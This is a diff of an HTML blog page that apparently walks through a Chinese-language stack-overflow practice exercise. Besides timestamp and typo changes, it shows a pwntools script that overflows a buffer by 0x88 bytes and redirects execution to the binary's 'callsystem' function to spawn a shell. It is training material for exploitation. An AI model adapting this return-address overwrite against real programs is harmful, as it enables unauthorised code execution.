@@ -164,7 +164,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2025-12-15 09:36:39
+          2025-12-17 00:28:34
         </span>
         
               <span class="post-tags">
@@ -198,7 +198,7 @@
 <p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251214195112045.png" alt="image-20251214195112045"></p>
 <p>显然，偏移的地址为0x80</p>
 <p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251214195454877.png" alt="image-20251214195454877"></p>
-<p>因为是64为，0x80的偏移，poc如下：</p>
+<p>因为是64位，0x80的偏移，poc如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;../practices/pwn0/level0&#x27;</span>)</span><br><span class="line"><span class="comment"># shell address in elf</span></span><br><span class="line">callsys_addr = elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;../practices/pwn0/level0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;World\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64 bit</span></span><br><span class="line"><span class="comment"># callsys_addr 后面+1 、+2 、+4都可</span></span><br><span class="line">payload= cyclic(<span class="number">8</span> * <span class="number">16</span> + <span class="number">8</span>) + p64(callsys_addr + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251215021241035.png" alt="image-20251215021241035"></p>
 <p><strong>为什么要在callsys_addr那里+1？其实还可以+2、+4。</strong></p>
@@ -303,7 +303,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2025-12-15 09:36:39
+              2025-12-17 00:28:34
             </span>
             
                   <span class="post-tags">
